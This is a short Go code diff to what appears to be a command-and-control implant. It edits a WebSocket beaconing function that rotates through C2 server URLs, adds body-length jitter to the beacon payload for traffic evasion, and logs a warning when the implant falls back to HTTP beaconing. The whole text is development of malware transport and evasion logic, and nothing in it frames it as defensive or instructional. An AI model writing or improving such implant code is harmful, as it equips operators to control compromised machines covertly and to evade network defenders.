@@ -16,14 +16,14 @@ import (
 func sendWSSBeacon(body []byte) []byte {
 	startIdx := int(currentC2Idx.Load())
 	urls := c2URLsSnapshot()
+	// Real body-length jitter (the WS frame carries the padded payload; the
+	// server strips the 8-byte length prefix like it does on the HTTP path).
+	body = padBeaconBody(body)
 	for i := 0; i < len(urls); i++ {
 		idx := (startIdx + i) % len(urls)
 		c2URL := urls[idx]
 
-		beaconURI := getActiveBeaconURI()
-		if ContentLengthJitter > 0 {
-			beaconURI = addRandomParam(beaconURI)
-		}
+		beaconURI := beaconWSURI()
 
 		wsURL, err := buildWSURL(c2URL, beaconURI)
 		if err != nil {
@@ -89,6 +89,15 @@ func sendWSSBeacon(body []byte) []byte {
 	if Debug {
 		fmt.Println("[!] All WS endpoints failed, falling back to HTTP")
 	}
+	// Loud, non-debug failure: WSS is the configured primary transport and
+	// every endpoint failed. Without this the beacon silently falls back to
+	// HTTPS POST while the operator believes WSS is live.
+	fmt.Printf("[c2] WARN: all WebSocket endpoints failed, falling back to HTTP beacon (%d URL(s), last attempt %s)\n", len(urls), func() string {
+		if len(urls) > 0 {
+			return urls[(startIdx+len(urls)-1)%len(urls)]
+		}
+		return "(none)"
+	}())
 	return sendBeacon(body)
 }
 
